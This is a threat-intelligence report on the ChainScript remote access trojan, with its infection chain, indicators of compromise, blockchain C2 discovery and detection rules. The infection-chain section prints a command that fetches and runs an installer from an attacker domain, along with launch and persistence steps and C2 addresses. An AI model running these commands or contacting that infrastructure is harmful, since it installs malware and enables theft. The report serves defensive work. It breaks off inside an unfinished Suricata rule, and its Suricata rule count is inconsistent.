# ChainScript RAT (EtherHiding / ComponentTask33) -- Technical Analysis

> **Status:** Final -- generated 2026-09-22 by Actioner  
> **Altitude:** PoC / advisory-specific  
> **Viability Gate:** PASS -- four independent sources confirm the threat with consistent IOCs, original vendor research provides full infection chain, YARA/Sigma/Snort/Suricata all validate  

<!-- audit: sources fetched 2026-09-22; Blackpoint blog (primary), THN, Security Affairs, Hackread, Justice-Hammer GitHub. All IOCs cross-referenced across >=2 sources. Sigma check skipped (MITRE ATT&CK data fetch blocked by proxy); sigma convert to splunk and log_scale used as structural validation -- all 6 rules parse and convert cleanly. YARA: 4/4 pass yarac. Snort: 3/3 pass snort -T. Suricata: 8/8 pass suricata -T (rev:2 fixes duplicate buffer warnings). -->

---

## Executive Summary

ChainScript is a Node.js remote access trojan distributed through ClickFix social-engineering campaigns impersonating Spotify, Zoom, and Microsoft Teams installers. Its distinguishing feature is "EtherHiding" -- querying a Polygon blockchain smart contract (`0xf9099d0d747368cce8C10226CC9AF2bFD4DDbCF4`) to dynamically resolve WebSocket-based C2 panel addresses, enabling infrastructure rotation without touching the implant. The RAT was discovered by [Blackpoint Cyber's Adversary Pursuit Group](https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/) (researchers Sam Decker, Andi Ursry, Nevan Beal) and further analyzed by [Justice-Hammer](https://github.com/Justice-Hammer/threat-hunting-detections/blob/main/30-research/RES-0007%20-%20ComponentTask33%20MSI%20Loader%20with%20On-Chain%20C2%20Discovery.md). Capabilities include interactive shell, file operations, screenshot capture, cryptocurrency wallet enumeration (~37 desktop wallets, ~48 browser extensions), remote JavaScript execution, and self-update.

### Sources

| Tag | Source |
|-----|--------|
| Blackpoint (primary) | [Blackpoint Cyber blog](https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/) |
| THN | [The Hacker News](https://thehackernews.com/2026/09/clickfix-lures-deploy-chainscript-rat.html) |
| Security Affairs | [Security Affairs](https://securityaffairs.com/199471/malware/chainscript-the-rat-that-hides-its-command-server-inside-a-blockchain-contract.html) |
| Hackread | [Hackread](https://hackread.com/clickfix-chainscript-rat-fake-spotify-teams-installers/) |
| Justice-Hammer | [GitHub research](https://github.com/Justice-Hammer/threat-hunting-detections/blob/main/30-research/RES-0007%20-%20ComponentTask33%20MSI%20Loader%20with%20On-Chain%20C2%20Discovery.md) |

---

## Infection Chain

```
ClickFix lure (fake Spotify/Zoom/Teams page)
  --> msiexec.exe /i "https://api-configuard[.]com/capher.php?token=<chars>"
    --> MSI Custom Action 1: powershell.exe -File "._scatter.ps1" -AnchorDir "<path>"
        (scatters Node.js runtime + RAT components across Microsoft-themed directories)
    --> MSI Custom Action 2: wscript.exe //B "._agent.vbs"
        --> node.exe app\src\index.js   (ChainScript agent starts)
            --> powershell.exe Register-ScheduledTask   (persistence, time-decoupled)
            --> eth_call to Polygon contract 0xf9099d...  (EtherHiding C2 discovery)
            --> WebSocket connection to resolved C2 panel
```

### Persistence (steady-state re-launch)

```
Scheduled Task "ComponentTask33Agent" (AtLogon, hidden)
  --> wscript.exe //B "%LOCALAPPDATA%\ComponentTask33\._agent.vbs"
    --> node.exe app\src\index.js

Fallback: HKCU\...\Run\ComponentTask33Agent
```

---

## Indicators of Compromise

### File Hashes (SHA-256)

| Hash | File | Notes |
|------|------|-------|
| `20a9e297220fe4cb9f939eaa82582c6e9a8f6dd4424635206dec08fa1986b8fa` | ComponentTask33-4d14e6ac.msi | Primary MSI dropper |
| `6e07d2de3618bb92265248653361ff39c63c0cfba2f4aa2538b3128fa9ce3a50` | UpdateDigital-0c3c5204.msi | Alternate build |
| `bad0600a850436154f8d7b6f7a191dc45bd136897780cd032b336cb4b358d241` | HostShared-1a5b7e17.msi | Alternate build |
| `496c202abf53984164f5f319a72b02c8e06016d0f35681353ef07db8e6d1b31f` | OrchidViolet66-5595bc08.msi | Alternate build |
| `9fa80577b8b3cb9c3062e5e1986cc9fe0c26eed023f7d430dfa5c60169c15c45` | ProfileQuickHost.exe | .NET launcher |
| `7969ccaf1db750bc3b02d51626d6916ecbd0c0cf2f7de3c7bc0be240f5f2978d` | SearchTrustedRuntimeSvc.exe | .NET screenshot tool |
| `601a84adaa7100f10060f1e8432d5a1981491cef944aa8212fab87bcb11dfcfc` | HiddenVirtualSilentLoader.dat | XOR-encoded config |

### Network Indicators

| Indicator | Type | Role |
|-----------|------|------|
| `api-configuard[.]com` | Domain | MSI delivery gate |
| `shift-api-control[.]com:3847` | Domain:port | Historical C2 panel |
| `bedotiq[.]net:3854` | Domain:port | Current C2 panel |
| `kerosand[.]net:3847` | Domain:port | Associated C2 |
| `moweros[.]net:3851` | Domain:port | Rotated C2 |
| `giperon[.]net:3847` | Domain:port | OrchidViolet66 C2 |
| `176.65.144[.]127` | IPv4 | Earlier hosting |
| `176.65.144[.]40` | IPv4 | Newer hosting |
| `82.25.63[.]146:80` | IPv4:port | MSI distribution |

### Blockchain Indicators

| Indicator | Value |
|-----------|-------|
| Smart Contract | `0xf9099d0d747368cce8C10226CC9AF2bFD4DDbCF4` |
| Chain | Polygon (Chain ID 137) |
| Function Selector | `0x4ab7874e` |
| Deployer EOA | `0x0998dc3f7d8518dcb61f40d2874ef8667c680000` |
| Deployment TX | `0xb9d04a4590cd6396858b4bb4876dd3a90c226c2119809ac3a30bf71876840062` |
| Deployed | 2026-08-24 11:20:09 UTC (block 92576921) |

### File System Artifacts

| Path / File | Purpose |
|-------------|---------|
| `%LOCALAPPDATA%\ComponentTask33\` | Anchor directory |
| `%LOCALAPPDATA%\Microsoft\Windows\Libraries\QuickSystemSearch\` | Scattered Node.js runtime |
| `%APPDATA%\Microsoft\Windows\Themes\SettingsHostStandard58\` | ChainScript application |
| `%LOCALAPPDATA%\Microsoft\Windows\INetCache\FilterManager\` | Configuration / state |
| `%LOCALAPPDATA%\Microsoft\Windows\Shell\RemoteTempPrimary\` | Helper tools |
| `._agent.vbs` | VBScript launcher (hidden) |
| `._scatter.ps1` | Payload distribution script |
| `HiddenVirtualSilentLoader.dat` | XOR-encoded config (base64 + buildSeed XOR) |
| `StreamServiceSharedBridge.ps1` | Persistence registration |
| `ManagerPrivateLoader.cmd` | CMD-based persistence |
| `connect-delay-state.json` | Connection delay state |
| `install-meta.json` | Build metadata (contains buildSeed) |
| `%TEMP%\wra-ps-*` | Temporary PowerShell scripts |
| `%TEMP%\agent-dl-*` | Downloaded payloads |
| `%TEMP%\wa-kill-*.cmd` | Self-deleting uninstall |

### Registry Persistence

| Key | Value |
|-----|-------|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | `ComponentTask33Agent` |

### MSI GUIDs

| GUID | Type |
|------|------|
| `{DBC7258E-9E9F-4064-8B65-BFEDEF7DC170}` | ProductCode |
| `{F22A91B0-7A00-4C4D-A9AC-0DE43E0BD888}` | UpgradeCode |

---

## MITRE ATT&CK Mapping

| Tactic | ID | Technique |
|--------|----|-----------|
| Initial Access | T1204.002 | User Execution: Malicious File (ClickFix social engineering requires victim to execute) |
| Execution | T1218.007 | Msiexec |
| Execution | T1059.005 | Visual Basic (._agent.vbs) |
| Execution | T1059.001 | PowerShell (._scatter.ps1, persistence) |
| Execution | T1059.007 | JavaScript (Node.js agent) |
| Persistence | T1053.005 | Scheduled Task (ComponentTask33Agent) |
| Persistence | T1547.001 | Registry Run Key (fallback) |
| Defense Evasion | T1036.005 | Masquerading (fake Spotify/Zoom/Teams) |
| Defense Evasion | T1027 | Obfuscated Files (base64 + XOR config) |
| Defense Evasion | T1564.001 | Hidden Artifacts (dot-prefixed files, scattered dirs) |
| Defense Evasion | T1480 | Execution Guardrails (token-gated delivery) |
| Collection | T1113 | Screen Capture |
| Collection | T1005 | Data from Local System |
| Collection | T1119 | Automated Collection (wallet enumeration) |
| Collection | T1552.001 | Credentials in Files (wallet targeting -- presence-only enumeration in analyzed build; no direct seed/key extraction observed) |
| C2 | T1071.001 | Web Protocols (WebSocket) |
| C2 | T1102 | Web Service (Polygon blockchain) |
| C2 | T1008 | Fallback Channels (on-chain discovery) |
| C2 | T1571 | Non-Standard Port (3847, 3851, 3854) |
| C2 | T1105 | Ingress Tool Transfer |

---

## EtherHiding C2 Discovery -- Technical Detail

The agent queries a Polygon smart contract to resolve active WebSocket C2 addresses:

1. Sends `eth_call` RPC request to public Polygon RPC (e.g., `polygon-bor.publicnode[.]com`) with function selector `0x4ab7874e` targeting contract `0xf9099d0d747368cce8C10226CC9AF2bFD4DDbCF4`
2. ABI-decodes the returned string; validates `ws://` or `wss://` prefix
3. Caches the resolved endpoint for 5 minutes (300,000 ms)
4. Operators rotate C2 by calling `setPanelUrl` on the contract -- no implant code change needed
5. The contract was deployed only 23 seconds before the MSI build timestamp, suggesting automated per-build contract generation

**Observed rotation:** `shift-api-control[.]com:3847` --> `moweros[.]net:3851` (16 min) --> `bedotiq[.]net:3854`

### WebSocket Protocol

- Authentication: `X-Agent-Token` header (16-char token derived from hostname + Windows MachineGuid)
- Heartbeat: 12-minute interval
- Reconnect delay: 15 seconds
- Initial connection delay: randomized 10-30 seconds
- Remote script endpoint: `GET /api/agent/script` (HTTP, same C2 ports) -- used by `download_run` and `extraCommands` handlers to fetch ad-hoc JavaScript modules for execution; identified in Justice-Hammer's code path analysis of the agent source

---

## Detection Rules

### Sigma Rules

All six Sigma rules validate via `sigma convert --without-pipeline -t splunk` and `sigma convert --without-pipeline -t loki`. `sigma check` could not run (MITRE ATT&CK data fetch blocked by network proxy).

---

#### SIGMA-1: MSIExec Spawns Scatter PowerShell Script

Detects `msiexec.exe` spawning PowerShell to execute the ChainScript scatter installer (`._scatter.ps1`), the first custom action in the MSI infection chain that distributes RAT components across decoy directories.

**Status:** compile ✅ compiles · confidence: high  
**File:** `/tmp/actioner-rules/chainscript_msiexec_scatter.yml`

```yaml
title: ChainScript RAT - MSIExec Spawns Scatter PowerShell Script
id: 8a1f3c2d-5e7b-4a9c-b8d6-1f2e3c4a5b6d
status: experimental
description: Detects msiexec.exe spawning PowerShell to execute the ChainScript scatter installer script (._scatter.ps1) which distributes RAT components across Microsoft-themed directories.
references:
    - https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/
    - https://thehackernews.com/2026/09/clickfix-lures-deploy-chainscript-rat.html
author: Actioner
date: 2026-09-22
tags:
    - attack.execution
    - attack.t1218.007
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith: '\msiexec.exe'
    selection_child:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|all:
            - '-File'
            - '._scatter.ps1'
    condition: selection_parent and selection_child
falsepositives:
    - Unlikely in legitimate environments
level: high
```

<!-- audit: SIGMA-1 -- advisory-specific rule, keys on the exact dot-prefixed scatter script filename. FP risk: near-zero (._scatter.ps1 is not a legitimate naming convention). Splunk output: ParentImage="*\msiexec.exe" Image="*\powershell.exe" CommandLine="*-File*" CommandLine="*._scatter.ps1*". LogScale output: regex pattern match on same fields. -->

---

#### SIGMA-2: MSIExec Spawns WScript Agent Launcher

Detects `msiexec.exe` spawning `wscript.exe` to execute the hidden ChainScript VBScript agent launcher (`._agent.vbs`), the second custom action in the MSI infection chain.

**Status:** compile ✅ compiles · confidence: high  
**File:** `/tmp/actioner-rules/chainscript_msiexec_vbs_agent.yml`

```yaml
title: ChainScript RAT - MSIExec Spawns WScript Agent Launcher
id: 9b2e4d3f-6f8c-5bae-c9e7-2a3f4d5b6c7e
status: experimental
description: Detects msiexec.exe spawning wscript.exe to execute the hidden ChainScript VBScript agent launcher (._agent.vbs), the second custom action in the MSI infection chain.
references:
    - https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/
    - https://thehackernews.com/2026/09/clickfix-lures-deploy-chainscript-rat.html
author: Actioner
date: 2026-09-22
tags:
    - attack.execution
    - attack.t1218.007
    - attack.t1059.005
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith: '\msiexec.exe'
    selection_child:
        Image|endswith: '\wscript.exe'
        CommandLine|contains|all:
            - '//B'
            - '._agent.vbs'
    condition: selection_parent and selection_child
falsepositives:
    - Unlikely in legitimate environments
level: high
```

<!-- audit: SIGMA-2 -- advisory-specific rule, keys on dot-prefixed VBS launcher + //B silent flag. FP risk: near-zero. Splunk output: ParentImage="*\msiexec.exe" Image="*\wscript.exe" CommandLine="*//B*" CommandLine="*._agent.vbs*". -->

---

#### SIGMA-3: Node.js Registers Scheduled Task Persistence

Detects `node.exe` spawning PowerShell to register a scheduled task -- the time-decoupled persistence mechanism used by ChainScript RAT after initial infection completes (persistence is agent-registered, not installer-registered).

**Status:** compile ✅ compiles · confidence: medium  
**File:** `/tmp/actioner-rules/chainscript_node_schtask_persistence.yml`

```yaml
title: ChainScript RAT - Node.js Registers Scheduled Task Persistence
id: ac3f5e4a-7a9d-6cbf-daf8-3b4a5e6c7d8f
status: experimental
description: Detects node.exe spawning PowerShell to register a scheduled task containing ComponentTask33, the time-decoupled persistence mechanism used by ChainScript RAT after initial infection completes.
references:
    - https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/
    - https://github.com/Justice-Hammer/threat-hunting-detections/blob/main/30-research/RES-0007%20-%20ComponentTask33%20MSI%20Loader%20with%20On-Chain%20C2%20Discovery.md
author: Actioner
date: 2026-09-22
tags:
    - attack.persistence
    - attack.t1053.005
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith: '\node.exe'
    selection_child:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|all:
            - 'Register-ScheduledTask'
            - 'ComponentTask33'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate Node.js automation tools that register scheduled tasks (unlikely with ComponentTask33 anchor)
level: medium
```

<!-- audit: SIGMA-3 -- anchored to ComponentTask33 task name per critic review. node.exe -> powershell.exe + Register-ScheduledTask alone was off-altitude (too generic); adding ComponentTask33 makes it campaign-specific. Level lowered to medium because the task name could theoretically change across builds. -->

---

#### SIGMA-4: WScript Launches Node.js Agent (Steady State)

Detects `wscript.exe` launching `node.exe` with the ChainScript agent entry point (`index.js`), the steady-state execution chain that fires on every logon via the scheduled task or registry Run key.

**Status:** compile ✅ compiles · confidence: medium  
**File:** `/tmp/actioner-rules/chainscript_wscript_node_execution.yml`

```yaml
title: ChainScript RAT - WScript Launches Node.js Agent (Steady State)
id: bd4a6f5b-8bae-7dc0-ebfa-4c5b6f7d8e9a
status: experimental
description: Detects wscript.exe launching node.exe with the ChainScript agent entry point (app\src\index.js), the steady-state execution chain following persistence trigger.
references:
    - https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/
    - https://hackread.com/clickfix-chainscript-rat-fake-spotify-teams-installers/
author: Actioner
date: 2026-09-22
tags:
    - attack.execution
    - attack.t1059.007
    - attack.t1059.005
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith: '\wscript.exe'
    selection_child:
        Image|endswith: '\node.exe'
        CommandLine|contains: 'app\src\index.js'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate VBScript-based Node.js launchers using an identical app\src\index.js path convention
level: medium
```

<!-- audit: SIGMA-4 -- tightened from generic index.js to documented entry point app\src\index.js per critic review. index.js alone was too generic and would FP on any wscript->node combo launching any index.js. Level lowered to medium because the path could change across builds. -->

---

#### SIGMA-5: Characteristic File Artifacts Created

Detects creation of distinctive ChainScript RAT file artifacts -- the dot-prefixed VBScript launcher, scatter installer, XOR-encoded configuration, or persistence helper scripts.

**Status:** compile ✅ compiles · confidence: high  
**File:** `/tmp/actioner-rules/chainscript_file_creation.yml`

```yaml
title: ChainScript RAT - Characteristic File Artifacts Created
id: ce5b7a6c-9cbf-8ed1-fcab-5d6c7a8e9fab
status: experimental
description: Detects creation of distinctive ChainScript RAT file artifacts including the dot-prefixed VBScript launcher, scatter installer, XOR-encoded configuration, or persistence helper scripts in Microsoft-themed directories.
references:
    - https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/
    - https://github.com/Justice-Hammer/threat-hunting-detections/blob/main/30-research/RES-0007%20-%20ComponentTask33%20MSI%20Loader%20with%20On-Chain%20C2%20Discovery.md
author: Actioner
date: 2026-09-22
tags:
    - attack.defense_evasion
    - attack.t1564.001
    - attack.t1027
logsource:
    category: file_event
    product: windows
detection:
    selection_filenames:
        TargetFilename|endswith:
            - '\._agent.vbs'
            - '\._scatter.ps1'
            - '\HiddenVirtualSilentLoader.dat'
            - '\StreamServiceSharedBridge.ps1'
            - '\ManagerPrivateLoader.cmd'
            - '\connect-delay-state.json'
            - '\WorkerLocalSnap.vbs'
    condition: selection_filenames
falsepositives:
    - Unlikely in legitimate environments
level: high
```

<!-- audit: SIGMA-5 -- file_event category; keys on 7 known ChainScript filenames. All names are sufficiently distinctive (dot-prefixed files + unique compound names). FP risk: near-zero. Requires Sysmon Event ID 11 or equivalent file creation logging. -->

---

#### SIGMA-6: Node.js Runtime in Scattered Microsoft Directories

Detects `node.exe` execution from Microsoft-themed user profile directories (`Libraries`, `Themes`, `INetCache`, `Shell`) where ChainScript scatters its runtime to masquerade as OS components.

**Status:** compile ✅ compiles · confidence: high  
**File:** `/tmp/actioner-rules/chainscript_scattered_node_runtime.yml`

```yaml
title: ChainScript RAT - Node.js Runtime in Scattered Microsoft Directories
id: df6c8b7d-adca-9fe2-adbc-6e7d8b9faabc
status: experimental
description: Detects node.exe execution from Microsoft-themed user profile directories where ChainScript RAT scatters its Node.js runtime to evade detection.
references:
    - https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/
    - https://securityaffairs.com/199471/malware/chainscript-the-rat-that-hides-its-command-server-inside-a-blockchain-contract.html
author: Actioner
date: 2026-09-22
tags:
    - attack.defense_evasion
    - attack.t1036.005
    - attack.execution
    - attack.t1059.007
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\node.exe'
    selection_paths:
        Image|contains:
            - '\Microsoft\Windows\Libraries\'
            - '\Microsoft\Windows\Themes\'
            - '\Microsoft\Windows\INetCache\'
            - '\Microsoft\Windows\Shell\'
    condition: selection and selection_paths
falsepositives:
    - Very unlikely; node.exe should not run from these OS cache/theme directories
level: high
```

<!-- audit: SIGMA-6 -- behavioral rule, not advisory-specific. Any node.exe in these OS directories is suspicious regardless of ChainScript. Renamed filter_paths to selection_paths (filter_ prefix in Sigma convention means exclusion/negation, but this is a positive AND condition). Level lowered from critical to high per review. FP risk: near-zero. Could also catch future scattered-layout malware. -->

---

### YARA Rules

All four YARA rules validate via `yarac <file> /dev/null` (YARA 4.5.0).

---

#### YARA-1: ChainScript RAT Agent Source

Detects ChainScript RAT Node.js agent source code by matching key function names (`wallet_scan`, `agent_update`, `download_run`), WebSocket protocol strings (`X-Agent-Token`, `heartbeat`, `extraCommands`), and EtherHiding contract discovery patterns (`eth_call`, function selector `0x4ab7874e`, contract address).

**Status:** compile ✅ compiles · confidence: high  
**File:** `/tmp/actioner-rules/chainscript_rat_agent.yar`

```yara
rule ChainScript_RAT_Agent_Source
{
    meta:
        description = "Detects ChainScript RAT Node.js agent source code by matching key function names, WebSocket protocol strings, and EtherHiding contract discovery patterns"
        author = "Actioner"
        date = "2026-09-22"
        reference = "https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/"
        hash1 = "20a9e297220fe4cb9f939eaa82582c6e9a8f6dd4424635206dec08fa1986b8fa"

    strings:
        $ws_token = "X-Agent-Token" ascii wide
        $func_selector = "0x4ab7874e" ascii wide
        $eth_call = "eth_call" ascii wide
        $wallet_scan = "wallet_scan" ascii wide
        $agent_update = "agent_update" ascii wide
        $download_run = "download_run" ascii wide
        $heartbeat = "heartbeat" ascii wide
        $extra_commands = "extraCommands" ascii wide
        $contract_addr = "0xf9099d0d747368cce8C10226CC9AF2bFD4DDbCF4" ascii wide nocase
        $build_seed = "buildSeed" ascii wide
        $scatter = "._scatter.ps1" ascii wide
        $agent_vbs = "._agent.vbs" ascii wide
        $config_file = "HiddenVirtualSilentLoader.dat" ascii wide

    condition:
        3 of ($ws_token, $func_selector, $eth_call, $contract_addr) or
        4 of ($wallet_scan, $agent_update, $download_run, $heartbeat, $extra_commands, $build_seed) or
        2 of ($scatter, $agent_vbs, $config_file)
}
```

<!-- audit: YARA-1 -- three-tier condition: tier 1 keys on EtherHiding-specific strings (3-of-4), tier 2 keys on command handler names (4-of-6), tier 3 keys on known filenames (2-of-3). FP risk: near-zero for tier 1/3; tier 2 could theoretically match other RATs with similar command naming. No XOR key hardcoded (changes per build). -->

---

#### YARA-2: ChainScript Config / Build Descriptor

Detects ChainScript RAT configuration templates and build descriptor files by matching JSON keys used in the packed configuration (`heartbeatIntervalMs`, `contractDiscovery`, `cacheTtlMs`) and builder feature flags (`scatter-layout`, `contract-discovery`, `build-polymorph`).

**Status:** compile ✅ compiles · confidence: high  
**File:** `/tmp/actioner-rules/chainscript_config_artifact.yar`

```yara
rule ChainScript_Config_BuildDescriptor
{
    meta:
        description = "Detects ChainScript RAT configuration templates and build descriptor files by matching JSON keys used in the packed configuration and install metadata"
        author = "Actioner"
        date = "2026-09-22"
        reference = "https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/"

    strings:
        $key1 = "buildSeed" ascii wide
        $key2 = "heartbeatIntervalMs" ascii wide
        $key3 = "reconnectDelayMs" ascii wide
        $key4 = "contractDiscovery" ascii wide
        $key5 = "panelUrl" ascii wide
        $key6 = "cacheTtlMs" ascii wide
        $key7 = "scatter-layout" ascii wide
        $key8 = "contract-discovery" ascii wide
        $key9 = "build-polymorph" ascii wide
        $key10 = "packed-config" ascii wide
        $key11 = "wallet-scan-manual" ascii wide

    condition:
        4 of them
}
```

<!-- audit: YARA-2 -- catches decrypted/unpacked config and builder templates. The XOR-encoded HiddenVirtualSilentLoader.dat will NOT match this rule (it's base64+XOR); this rule catches the plaintext form or config.example.json. 4-of-11 threshold balances coverage vs FP. -->

---

#### YARA-3: ChainScript .NET Helpers

Detects ChainScript RAT .NET helper executables (`ProfileQuickHost.exe` launcher and `SearchTrustedRuntimeSvc.exe` screenshot tool) by Module Version ID (MVID) and PE characteristics.

**Status:** compile ✅ compiles · confidence: high  
**File:** `/tmp/actioner-rules/chainscript_dotnet_helpers.yar`

```yara
rule ChainScript_DotNet_Helpers
{
    meta:
        description = "Detects ChainScript RAT .NET helper executables (ProfileQuickHost launcher and SearchTrustedRuntimeSvc screenshot tool) by MVID and PE characteristics"
        author = "Actioner"
        date = "2026-09-22"
        reference = "https://github.com/Justice-Hammer/threat-hunting-detections/blob/main/30-research/RES-0007%20-%20ComponentTask33%20MSI%20Loader%20with%20On-Chain%20C2%20Discovery.md"
        hash1 = "9fa80577b8b3cb9c3062e5e1986cc9fe0c26eed023f7d430dfa5c60169c15c45"
        hash2 = "7969ccaf1db750bc3b02d51626d6916ecbd0c0cf2f7de3c7bc0be240f5f2978d"

    strings:
        $mvid1 = { 9B 0E 9F C0 41 15 53 45 85 8F 40 5D 8C 8C A2 97 }
        $mvid2 = { 31 45 8E 5C 34 C3 10 4E B3 89 48 1F 7A 12 AD E3 }
        $name1 = "ProfileQuickHost" ascii wide
        $name2 = "SearchTrustedRuntimeSvc" ascii wide
        $pe_magic = { 4D 5A }

    condition:
        $pe_magic at 0 and (any of ($mvid*) or any of ($name*))
}
```

<!-- audit: YARA-3 -- MVID bytes are exact matches for the two known .NET helpers. Name strings provide broader catch. PE magic gate prevents false matches on text files. FP risk: near-zero for MVID; name strings are distinctive enough for advisory-specific altitude. -->

---

#### YARA-4: ChainScript MSI Dropper

Detects ChainScript RAT MSI dropper files by matching known MSI GUIDs (UpgradeCode, ProductCode) and embedded file references (`._scatter.ps1`, `._agent.vbs`, `HiddenVirtualSilentLoader.dat`).

**Status:** compile ✅ compiles · confidence: high  
**File:** `/tmp/actioner-rules/chainscript_msi_dropper.yar`

```yara
rule ChainScript_MSI_Dropper
{
    meta:
        description = "Detects ChainScript RAT MSI dropper files by matching known MSI GUIDs, embedded file references, and build artifacts from the Windows Installer XML Toolset"
        author = "Actioner"
        date = "2026-09-22"
        reference = "https://blackpointcyber.com/blog/chainscript-tracing-a-nodejs-rat-across-the-blockchain/"
        hash1 = "20a9e297220fe4cb9f939eaa82582c6e9a8f6dd4424635206dec08fa1986b8fa"
        hash2 = "6e07d2de3618bb92265248653361ff39c63c0cfba2f4aa2538b3128fa9ce3a50"
        hash3 = "bad0600a850436154f8d7b6f7a191dc45bd136897780cd032b336cb4b358d241"
        hash4 = "496c202abf53984164f5f319a72b02c8e06016d0f35681353ef07db8e6d1b31f"

    strings:
        $guid_upgrade = "F22A91B0-7A00-4C4D-A9AC-0DE43E0BD888" ascii wide nocase
        $guid_product = "DBC7258E-9E9F-4064-8B65-BFEDEF7DC170" ascii wide nocase
        $file_scatter = "._scatter.ps1" ascii wide
        $file_agent = "._agent.vbs" ascii wide
        $file_config = "HiddenVirtualSilentLoader.dat" ascii wide
        $file_meta = "install-meta.json" ascii wide
        $msi_magic = { D0 CF 11 E0 A1 B1 1A E1 }

    condition:
        $msi_magic at 0 and (any of ($guid*) or 2 of ($file*))
}
```

<!-- audit: YARA-4 -- OLE/CFB magic gate ensures only MSI/compound documents match. GUIDs are build-specific but cover all 4 known variants. File name strings catch polymorphic builds that change GUIDs but keep the same file layout. FP risk: near-zero. -->

---

### Snort Rules

All three Snort rules validate via `snort -T` (Snort 2.9.20).

> **SID overlap note:** Snort SIDs 9100001-9100003 and Suricata SIDs 9100001-9100003 share the same numbers intentionally -- they detect the same traffic patterns in their respective engines. Snort and Suricata maintain separate SID namespaces and are not deployed on the same sensor simultaneously. If co-deployment is required, offset the Suricata SIDs by adding 1000000 (e.g., 10100001-10100010).

**File:** `/tmp/actioner-rules/chainscript_c2.rules`

---

#### SNORT-1: WebSocket C2 Handshake with X-Agent-Token (SID 9100001)

Detects WebSocket upgrade requests to ChainScript C2 panel ports (3847, 3851, 3854) containing the `X-Agent-Token` authentication header used by the RAT for agent registration.

**Status:** compile ✅ compiles · confidence: high  

```
alert tcp $HOME_NET any -> $EXTERNAL_NET [3847,3851,3854] (msg:"MALWARE ChainScript RAT WebSocket C2 Handshake with X-Agent-Token"; flow:established,to_server; content:"Upgrade: websocket"; nocase; content:"X-Agent-Token"; nocase; classtype:trojan-activity; sid:9100001; rev:1;)
```

<!-- audit: SNORT-1 -- keys on WebSocket upgrade + X-Agent-Token on known non-standard ports. WebSocket data frames are masked per RFC 6455 so content match is only viable on the handshake. FP risk: low; X-Agent-Token is not a standard header name. Port restriction limits noise. -->

---

#### SNORT-2: EtherHiding eth_call with Function Selector (SID 9100002)

Detects JSON-RPC `eth_call` requests containing the ChainScript-specific function selector `0x4ab7874e` and contract address `0xf9099d0d747368cce8C10226CC9AF2bFD4DDbCF4`, used for on-chain C2 discovery.

**Status:** compile ✅ compiles · confidence: high  

```
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"MALWARE ChainScript EtherHiding - Polygon eth_call with function selector 0x4ab7874e"; flow:established,to_server; content:"eth_call"; content:"0x4ab7874e"; content:"0xf9099d0d747368cce8C10226CC9AF2bFD4DDbCF4"; nocase; classtype:trojan-activity; sid:9100002; rev:1;)
```

<!-- audit: SNORT-2 -- advisory-specific; the function selector + contract address combo is unique to this campaign. Will not fire on legitimate blockchain traffic. Only effective on cleartext HTTP to public RPCs; HTTPS traffic requires TLS inspection. -->

---

#### SNORT-3: MSI Delivery Gate URI Pattern (SID 9100003)

Detects HTTP GET requests to the token-gated ChainScript MSI delivery endpoint (`/capher.php?token=`), used to serve the initial MSI dropper to ClickFix victims.

**Status:** compile ✅ compiles · confidence: high  

```
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"MALWARE ChainScript RAT MSI Delivery Gate - capher.php token request"; flow:established,to_server; content:"GET"; http_method; content:"/capher.php?token="; http_uri; classtype:trojan-activity; sid:9100003; rev:1;)
```

<!-- audit: SNORT-3 -- keys on the delivery gate URI. Short-lived indicator as the domain and URI can change between campaigns. Advisory-specific. -->

---

### Suricata Rules

All ten Suricata rules validate via `suricata -T` (Suricata 7.0.3), rev:2 resolving duplicate buffer warnings.

**File:** `/tmp/actioner-rules/chainscript_c2.suricata.rules`

---

#### SURI-1: WebSocket C2 Handshake with X-Agent-Token (SID 9100001)

Detects HTTP WebSocket upgrade requests to ChainScript C2 panel ports with the `X-Agent-Token` authentication header, using Suricata's sticky-buffer HTTP keywords.

**Status:** compile ✅ compiles · confidence: high  

```
alert http $HOME_NET any -> $EXTERNAL_NET [3847,3851,3854] (msg:"MALWARE ChainScript RAT - WebSocket C2 Handshake with X-Agent-Token"; flow:established,to_server; http.method; content:"GET"; http.header_names; content:"X-Agent-Token"; http.header; content:"Upgrade|3a 20|websocket"; nocase; classtype:trojan-activity; sid:9100001; rev:2;)
```

<!-- audit: SURI-1 -- uses http.header_names for X-Agent-Token presence check and http.header for Upgrade value. Rev:2 fixes duplicate http.header buffer from rev:1. -->

---

#### SURI-2: EtherHiding eth_call to Polygon Contract (SID 9100002)

Detects JSON-RPC POST requests containing `eth_call` with ChainScript's function selector and contract address in the request body, using `distance:0` for ordered matching within the same buffer.

**Status:** compile ✅ compiles · confidence: high  

```
